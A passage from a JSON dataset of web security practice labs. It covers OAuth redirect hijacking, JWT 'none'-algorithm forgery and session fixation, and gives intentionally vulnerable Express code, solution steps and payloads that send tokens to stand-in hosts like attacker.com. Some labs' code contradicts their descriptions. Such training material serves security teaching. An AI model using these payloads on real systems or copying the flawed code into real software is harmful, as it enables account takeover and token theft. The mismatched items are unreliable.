    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to analyze the OAuth flow and capture the authorization URL including the state parameter.",
      "Replace the 'state' parameter value with an attacker-controlled redirect URI that points to your malicious server.",
      "Send this manipulated link to the victim and wait for them to authorize the request.",
      "Monitor your server to capture the victim’s access token in the redirected request.",
      "Use Postman to set the Authorization header to 'Bearer {captured-token}' and access /my-account as carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(require('body-parser').urlencoded({ extended: true })); app.get('/auth', (req, res) => { const { response_type, client_id, redirect_uri, state } = req.query; const token = 'token-carlos-xyz'; const redirect = `${redirect_uri}#access_token=${token}&state=${state}`; res.redirect(redirect); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-carlos-xyz') res.send('Account details for carlos'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Implicit Flow Lab running on http://localhost:4000'));",
    "payloads": [
      "Authorization URL: /auth?response_type=token&client_id=app123&redirect_uri=http://attacker.com/catch&state=abc123",
      "Authorization: Bearer token-carlos-xyz"
    ]
  },
  {
    "Lab scenario": "JWT Signature Verification Bypass in Token Validation Middleware",
    "Lab Description": "The application uses JSON Web Tokens (JWT) for session management but improperly trusts the 'alg' field from the token header. When this is set to 'none', the application skips signature verification. The application issues JWTs signed with a secret and expects a valid signature. To solve: Forge a valid token for 'carlos' by exploiting the 'none' algorithm bypass and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a login request using Burp Suite and capture a valid JWT from the Authorization header.",
      "Validate the token structure and identify the 'alg' value in the decoded JWT header using jwt.io.",
      "Craft a new JWT with the 'alg' set to 'none' and the payload containing 'username':'carlos'.",
      "Replace the original token with the crafted unsigned JWT in Burp Repeater and forward the request.",
      "If successful, observe that the account page for 'carlos' loads, confirming the signature bypass."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET_KEY = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, SECRET_KEY, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; if (!token) return res.status(401).send('Token missing'); const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { res.send(`Account details for ${decoded.payload.username}`); } else { try { jwt.verify(token, SECRET_KEY); res.send(`Account details for ${decoded.payload.username}`); } catch { res.status(403).send('Invalid token'); } } }); app.listen(4000, () => console.log('JWT Signature Bypass Lab running on http://localhost:4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9"
    ]
  },
  {
    "Lab scenario": "OAuth Authorization Code Interception in Redirect Handler",
    "Lab Description": "The application implements OAuth 2.0 for third-party login using a redirect_uri parameter vulnerable to open redirection. An attacker can intercept the authorization code before token exchange. The application trusts user-controlled redirect URLs without validation. To solve: Steal Carlos's authorization code via a manipulated redirect_uri and log into his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth flow and modify the redirect_uri to a malicious domain you control.",
      "Use a local listener (like Postman Interceptor or Burp Collaborator) to capture the authorization code when the victim authenticates.",
      "Manually exchange the intercepted authorization code for an access token using Postman or curl.",
      "Use the obtained token to make an authenticated request to /my-account as Carlos.",
      "Verify the successful compromise by accessing Carlos's profile data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = 'authcode123'; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.post('/token', (req, res) => { const { code } = req.body; if (code === 'authcode123') res.json({ access_token: 'supersecrettoken' }); else res.status(400).send('Invalid code'); }); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (auth === 'Bearer supersecrettoken') res.send('Account details for carlos'); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('OAuth Code Interception Lab running on http://localhost:4000'));",
    "payloads": [
      "https://attacker.com/callback?code=authcode123",
      "https://malicious-site.io/callback?code=authcode123"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Insecure Cookie Assignment in Login Flow",
    "Lab Description": "The application improperly assigns the session identifier before user authentication, allowing attackers to fixate a known session ID. The server does not regenerate the session token post-login. To solve: Fixate a session ID before login and trick Carlos into logging in, then reuse the same session to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the initial GET /login request and observe the Set-Cookie response with session ID.",
      "Send the fixed session ID to the victim via social engineering and wait for them to log in.",
      "Once the victim logs in, reuse the same fixed session cookie in Burp Repeater.",
      "Access the /my-account endpoint while sending the fixed session cookie to hijack the authenticated session.",
      "Confirm access to Carlos's account, demonstrating successful session fixation exploitation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { if (!req.cookies.session) { const sid = Math.random().toString(36).substring(2); res.cookie('session', sid); res.send('Session initialized'); } else { res.send('Session exists'); } }); const users = { 'carlos': { password: 'qwerty', session: null } }; app.post('/authenticate', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { users[username].session = req.cookies.session; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = Object.keys(users).find(u => users[u].session === req.cookies.session); if (user) res.send(`Account details for ${user}`); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
    "payloads": [
      "session=attackerfixedsession",
      "session=knownsessionvalue"
    ]
  },
  {
    "Lab scenario": "JWT signature verification bypass in REST API login",
    "Lab Description": "This lab's RESTful authentication mechanism uses JWTs but fails to verify the token signature correctly when the 'alg' field is manipulated. The application accepts JWTs from clients to grant access to protected resources. However, the backend incorrectly trusts unsigned tokens when the 'alg' is set to 'none'. To solve: craft and submit a forged token to access Carlos's protected account endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a valid JWT token using Burp Suite by logging into your own account and intercepting the Authorization header.",
      "Inspect the JWT token in jwt.io and observe the 'alg' header, which is likely set to HS256.",
      "Modify the JWT header to set 'alg' to 'none' and remove the signature part of the token.",
      "Modify the payload section to change the username to 'carlos' and re-encode the JWT.",
      "Resend the forged token using Burp Repeater in the Authorization header and confirm the server grants access to Carlos's /my-account endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { carlos: 'password123' }; const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ user: username }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).json({ error: 'Invalid credentials' }); } }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret); res.send(`Welcome ${decoded.user}`); } catch { res.status(403).send('Access Denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Auth Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "{\"alg\":\"none\"}",
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session tokens in login flow",
    "Lab Description": "This web application's login process is vulnerable to session fixation. The server fails to regenerate session tokens upon successful login, allowing an attacker to set a valid session ID in advance and hijack a victim's authenticated session. To solve: pre-set a session ID before login, then log in as Carlos using that fixed session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, intercept the GET /login page request and note the Set-Cookie response containing the session ID.",
      "Modify the session cookie to a chosen predictable value, such as 'fixed-session-id', using Burp Repeater or browser dev tools.",
      "Send the fixed session ID to Carlos via social engineering or session injection (simulated for the lab).",
      "Log in as Carlos using his known credentials while maintaining the fixed session ID.",
      "After login, navigate to /my-account to confirm access using the pre-set session token."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = { carlos: 'letmein' }; app.get('/login', (req, res) => { const sessionId = req.cookies.sessionid || Math.random().toString(36).substring(2); res.cookie('sessionid', sessionId); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { res.send(`Logged in as ${username}`); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.cookies.sessionid === 'fixed-session-id') { res.send('Welcome carlos'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: sessionid=fixed-session-id",
      "POST /login with pre-set Cookie: sessionid=fixed-session-id",
      "Use same sessionid to access /my-account"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration leaking authorization code via redirect URI manipulation",
    "Lab Description": "This lab's OAuth 2.0 implementation misconfigures the allowed redirect URIs, failing to validate the domain properly. Attackers can manipulate the redirect URI to capture the authorization code for any user. To solve: hijack Carlos's authorization code and use it to obtain an access token and access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using OWASP ZAP or Burp Suite, initiate an OAuth login flow and observe the redirect_uri parameter in the authorization URL.",
      "Modify the redirect_uri to an attacker-controlled domain using an open redirect service like https://evil.com/path.",
      "Send the modified URL to Carlos (simulated) and wait for him to authenticate and be redirected to your server capturing the authorization code.",
      "Exchange the captured authorization code for an access token via POST /oauth/token using Postman.",
      "Use the obtained access token in the Authorization header to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const authCodes = {}; const tokens = {}; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = Math.random().toString(36).substring(2); authCodes[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (authCodes[code]) { const token = `token-${authCodes[code]}`; tokens[token] = authCodes[code]; res.json({ access_token: token }); } else { res.status(400).json({ error: 'Invalid code' }); } }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; if (tokens[token]) { res.send(`Account details for ${tokens[token]}`); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Misconfig Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://vulnerable.com/authorize?client_id=xyz&redirect_uri=https://evil.com/path&state=abc",
      "POST /oauth/token with code=<captured_code>",
      "Authorization: Bearer token-carlos"
    ]
  },
  {
    "Lab scenario": "JWT token signature vulnerability in session management",
    "Lab Description": "This lab's session management mechanism uses JSON Web Tokens (JWT) for authentication but fails to securely verify the token's signature. The application uses a hardcoded secret and doesn't validate the algorithm properly. To solve: forge a valid admin token using the known public key and access the admin control panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept and decode the JWT token after authenticating with a user account.",
      "Validate if the token's 'alg' header can be modified by setting it to 'none' or 'HS256' without verification failures.",
      "Craft a custom JWT token with 'alg' set to 'HS256' and use 'admin' as the username, signing it using the discovered or null secret.",
      "Resend the forged token as a cookie using Burp Repeater to access the /admin page.",
      "Verify successful exploitation by observing the 'Admin Control Panel' interface."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET_KEY = 'insecuresecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username, role: 'user' }, SECRET_KEY, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET_KEY); if (decoded.role === 'admin') { res.send('Welcome Admin!'); } else { res.status(403).send('Forbidden'); } } catch (err) { res.status(401).send('Invalid Token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "Header: { \"alg\": \"HS256\", \"typ\": \"JWT\" }, Payload: { \"user\": \"admin\", \"role\": \"admin\" }, Signature: HMAC(HS256, 'insecuresecret')",
      "Header: { \"alg\": \"none\" }, Payload: { \"user\": \"admin\", \"role\": \"admin\" }, Signature: ''"
    ]
  },
  {
    "Lab scenario": "OAuth implicit grant misconfiguration in login flow",
    "Lab Description": "This lab simulates an OAuth-based login mechanism that incorrectly trusts user-supplied redirect URIs and fails to validate tokens properly. The application exposes the access token directly in the URL hash, allowing attackers to manipulate it. To solve: hijack an OAuth token using a crafted redirect URI and access the victim's protected resources.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to passively scan the OAuth flow during login and extract the authorization URL.",
      "Modify the redirect_uri parameter to an attacker-controlled domain and observe token leakage via URL fragments.",
      "Construct a malicious OAuth authorization request that uses the manipulated redirect_uri.",
      "Capture the leaked token using a listener on the attacker's server (e.g., with netcat or Burp Collaborator).",
      "Replay the stolen token to the /account endpoint and confirm ownership of the victim's session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const users = { 'carlos': { accessToken: 'abc123token' } }; app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const token = users['carlos'].accessToken; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/account', (req, res) => { const { token } = req.query; if (token === users['carlos'].accessToken) { res.send('Welcome, carlos!'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "https://victim-site.com/auth?redirect_uri=https://attacker.com/capture",
      "https://attacker.com/#access_token=abc123token"
    ]
  },
  {
    "Lab scenario": "Session fixation attack via URL parameter in login endpoint",
    "Lab Description": "This lab's login endpoint fails to regenerate session tokens after successful authentication, allowing attackers to set their own session ID via a URL parameter. If the session ID remains unchanged after login, attackers can predetermine the victim's session. To solve: fixate your session ID and access Carlos's account after forcing him to log in.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a GET request to /login?session=attackersessionid and note the session cookie assigned.",
      "Craft a phishing link containing the same session ID and send it to the victim.",
      "Upon victim login, the session remains fixed to 'attackersessionid', allowing hijacking.",
      "Use the same session cookie in your browser or Postman to access the /my-account endpoint.",
      "Verify that the server returns the victim's personalized account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { const sessionID = req.query.session || Math.random().toString(36).substr(2); res.cookie('session', sessionID); res.send('Session initialized'); }); app.get('/my-account', (req, res) => { const session = req.cookies.session; if (session === 'attackersessionid') { res.send('Welcome carlos!'); } else { res.send('Welcome guest'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "GET /login?session=attackersessionid",
      "Set-Cookie: session=attackersessionid",
      "GET /my-account with Cookie: session=attackersessionid"
    ]
  },
  {
    "Lab scenario": "JWT Signature None Algorithm Bypass in Authorization Header",
    "Lab Description": "This lab's authentication system uses JSON Web Tokens (JWT) for session management. The server-side JWT verification improperly trusts tokens with the `alg` field set to 'none'. The application signs user sessions, but fails to enforce algorithm validation during token parsing, allowing attackers to forge tokens without knowing the secret key. To solve: Log in as the 'carlos' user by crafting a valid JWT without the signing key.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the JWT token after logging into your own account using Burp Suite.",
      "Validate that the token uses HS256 or RS256 by decoding the header and checking the `alg` field.",
      "Modify the JWT header: set `alg` to `none` and remove the signature part of the token.",
      "Set the `sub` claim in the payload to `carlos` and replace your session cookie in the browser with the forged token.",
      "Visit the /my-account endpoint to confirm successful login as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecretkey'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'password123') { const token = jwt.sign({ sub: username }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'RS256', 'none'] }); res.send('Account details for ' + decoded.sub); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Algorithm Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ",
      "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ."
    ]
  },
  {
    "Lab scenario": "Session Fixation via URL Parameter in Login Flow",
    "Lab Description": "This lab's session handling mechanism is vulnerable to fixation attacks. The session ID is accepted from a user-supplied URL parameter (`sessionId`) and assigned without regeneration upon login, enabling attackers to predetermine session IDs for victims. To solve: Log in as Carlos by fixing a session ID before authentication and reuse it post-login to hijack his session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP or Burp Suite to intercept the initial GET /login request and observe the URL sessionId parameter.",
      "Confirm that the server allows setting the session ID via the URL and does not regenerate it after successful login.",
      "Craft a phishing link embedding a predictable `sessionId` value like `/login?sessionId=attackersession123`.",
      "Wait until the victim uses this link and logs in. Then reuse the same `sessionId` in your own browser to access /my-account.",
      "Verify that you now have access to the victim's session as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { const sid = req.query.sessionId || Math.random().toString(36).substring(2); res.cookie('sessionId', sid); res.send(`<form method='POST' action='/login'>Username: <input name='username'/><br>Password: <input name='password'/><br><button>Login</button></form>`); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'supersecret') res.redirect('/my-account'); else res.status(401).send('Invalid credentials'); }); app.get('/my-account', (req, res) => { const sessionId = req.cookies['sessionId']; if (sessionId === 'attackersession123') res.send('Account details for carlos'); else res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "http://victim-app/login?sessionId=attackersession123",
      "sessionId=attackersession123",
      "Cookie: sessionId=attackersession123"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration Token Leakage in Redirect URI",
    "Lab Description": "This lab's OAuth implementation is vulnerable due to overly permissive redirect URI validation. An attacker can manipulate the redirect URI parameter to leak authorization codes to a malicious domain. The OAuth server accepts partial matching on registered redirect URIs, making it possible to inject crafted URLs. To solve: Extract the OAuth token for Carlos and access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth login flow and inspect the `redirect_uri` parameter.",
      "Modify `redirect_uri` to embed a malicious endpoint using an open redirect or subdomain like `https://attacker.com?code=`.",
      "Login as Carlos and complete the OAuth flow to capture the leaked authorization code in your listener.",
      "Exchange the stolen code for an access token via Postman or curl.",
      "Use the access token to call the /my-account API as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = 'authcode1234'; if (redirect_uri.startsWith('https://trusted.com')) { const redirect = `${redirect_uri}?code=${code}&state=${state}`; res.redirect(redirect); } else { res.status(400).send('Invalid redirect URI'); } }); app.get('/token', (req, res) => { const { code } = req.query; if (code === 'authcode1234') res.json({ access_token: 'valid_token_for_carlos' }); else res.status(400).send('Invalid code'); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer valid_token_for_carlos') res.send('Account details for carlos'); else res.status(401).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Misconfig Token Leak Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://attacker.com?code=",
      "https://trusted.com.attacker.com",
      "https://trusted.com%00.attacker.com"
    ]
  },
  {
    "Lab scenario": "Session Fixation via predictable session tokens in login flow",
    "Lab Description": "This lab demonstrates a session fixation vulnerability within the login mechanism. The application assigns session IDs prior to authentication but fails to regenerate them post-login, allowing an attacker to fixate a session. The application uses insecure random generation for the session token which is passed as a cookie. To solve: fixate Carlos's session and access his account by predefining the session ID before he logs in.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite's Proxy and Intercept to inspect the login request and response to identify the session cookie assigned pre-authentication.",
      "Confirm that the same session cookie persists after a successful login, indicating the vulnerability.",
      "Craft a malicious link embedding the session ID in the cookie and deliver it to the victim (Carlos) via social engineering.",
      "Once Carlos logs in using the fixated session, reuse the same session ID in your browser to gain access to his authenticated session.",
      "Verify access by navigating to /my-account and confirming Carlos's account data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const crypto = require('crypto'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const users = { carlos: 'hunter2' }; app.use((req, res, next) => { if (!req.cookies.session) { const sessionId = crypto.randomBytes(4).toString('hex'); res.cookie('session', sessionId); } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { res.send('Login successful. Welcome ' + username); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { res.send('Account page for logged in user.'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
    "payloads": [
      "Set-Cookie: session=deadbeef;",
      "Inject fixated session ID via intercepted HTTP request before victim login.",
      "Share crafted malicious URL with embedded session parameter.",
      "Replay the fixed session post-victim login."
    ]
  },
  {
    "Lab scenario": "JWT token signature spoofing via 'none' algorithm",
    "Lab Description": "This lab uses JWT tokens for authentication but fails to properly enforce signature verification, accepting tokens with the algorithm field set to 'none'. The application trusts the header-supplied algorithm, allowing attackers to bypass authentication by supplying an unsigned token. To solve: forge a token for Carlos without needing the secret and log into his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture a valid JWT token from your own account during login.",
      "Decode the JWT token using jwt.io or Burp Decoder to inspect its structure.",
      "Modify the 'alg' field in the header to 'none' and change the payload's username to 'carlos'.",
      "Remove the signature part entirely and re-encode the JWT token.",
      "Replay the modified token in the Authorization header and access /my-account to confirm successful login as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Unauthorized'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none' || jwt.verify(token, SECRET)) { res.send('Welcome ' + decoded.payload.username); } else { res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT None Algorithm Lab running on http://localhost:4000'));",
    "payloads": [
      "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
      "Payload: { \"username\": \"carlos\" }",
      "JWT token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer [forged_token]"
    ]
  },
  {
    "Lab scenario": "OAuth2 token leakage via referrer header in third-party redirect",
    "Lab Description": "This lab demonstrates insecure OAuth2 token handling. After successful authorization, the application redirects users to a third-party site, leaking the token in the Referer header. Attackers can capture the token from this third-party service and reuse it. To solve: capture Carlos's leaked OAuth token and use it to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite's Proxy to capture the OAuth2 authorization flow and observe the 'Location' header on redirect.",
      "Identify the OAuth2 access token being appended as a query parameter during redirection to a third-party domain.",
      "Set up your own HTTP server to mimic the third-party service and intercept incoming requests with tokens.",
      "Send Carlos a crafted phishing link that triggers OAuth flow; once he logs in, the token will be sent to your server via the Referer header.",
      "Replay the intercepted token using Postman to authenticate as Carlos and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); const tokens = { carlos: 'abc123token' }; app.get('/auth', (req, res) => { const { user } = req.query; const token = tokens[user]; res.redirect('http://third-party.com/welcome?access_token=' + token); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer abc123token') { res.send('Carlos Account Details'); } else { res.status(401).send('Unauthorized'); } }); app.listen(4000, () => console.log('OAuth Token Leak Lab running on http://localhost:4000'));",
    "payloads": [
      "Intercept Referer header during third-party redirect: access_token=abc123token",
      "Crafted phishing OAuth consent link: http://victim-app.com/auth?user=carlos",
      "Authorization: Bearer abc123token",
      "Replay token in Postman or Burp to access /my-account"
    ]
  },
  {
    "Lab scenario": "JWT signature spoof via algorithm confusion",
    "Lab Description": "This lab demonstrates an insecure JSON Web Token (JWT) validation implementation that incorrectly trusts the 'alg' header of incoming tokens. The application uses symmetric HMAC verification but allows switching the algorithm to 'none'. To solve: Craft a forged token to escalate to the 'admin' user and access the admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the JWT from a logged-in user request and decode it using jwt.io or Burp Decoder.",
      "Confirm the JWT structure and spot the 'alg' value set to 'HS256'. Change it to 'none' and remove the signature part.",
      "Manually edit the payload to replace your username with 'admin'.",
      "Send the modified token using Burp Repeater to authenticate as 'admin'.",
      "Visit the /admin route to verify successful privilege escalation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(token, secret); if (payload.username === 'admin') { res.send('Welcome, admin!'); } else { res.status(403).send('Access Denied'); } } catch (e) { res.status(401).send('Invalid Token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Spoof Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "OAuth authorization code reuse",
    "Lab Description": "This lab's OAuth 2.0 flow is improperly designed, allowing an attacker to reuse a captured authorization code to hijack a user session. The application does not properly invalidate codes after first use. To solve: Steal and reuse a victim's authorization code to log in as that user.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to proxy your login and capture the OAuth redirection flow.",
      "Analyze the authorization code grant flow, note the 'code' parameter in the URL.",
      "Intercept the victim's OAuth callback request and capture their 'code' value.",
      "Manually replay the callback request using the victim's code via Burp Repeater.",
      "Access the victim's account dashboard to confirm successful session hijack."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.use(express.urlencoded({ extended: true })); let sessions = {}; app.get('/oauth/callback', async (req, res) => { const code = req.query.code; if (!code) return res.status(400).send('No code provided'); try { const tokenResponse = await axios.post('https://auth-server/token', { code }); sessions[req.ip] = tokenResponse.data.user; res.redirect('/my-account'); } catch (err) { res.status(500).send('OAuth exchange failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.ip]; if (!user) return res.status(401).send('Not logged in'); res.send(`Welcome ${user}`); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Code Reuse Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "/oauth/callback?code=stolen_code_value",
      "/oauth/callback?code=previously_valid_code",
      "/oauth/callback?code=reused_auth_code"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session IDs",
    "Lab Description": "This lab simulates a session fixation vulnerability where the session identifier is predictable and not regenerated after login. The application uses user-controlled session IDs from URL parameters, allowing attackers to set a session ID before authentication. To solve: Fixate a session ID before login and hijack the authenticated session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a GET request to /login?sessionId=attacker123 before authentication.",
      "Send the same sessionId parameter to the victim in a phishing link and wait for them to log in.",
      "Once the victim logs in using the fixed session ID, send a GET /my-account request using the same sessionId cookie.",
      "Observe the response to confirm account takeover.",
      "Access /my-account to solve the lab and complete the session hijack."
    ],
    "Vulnerability name": "Authentication",
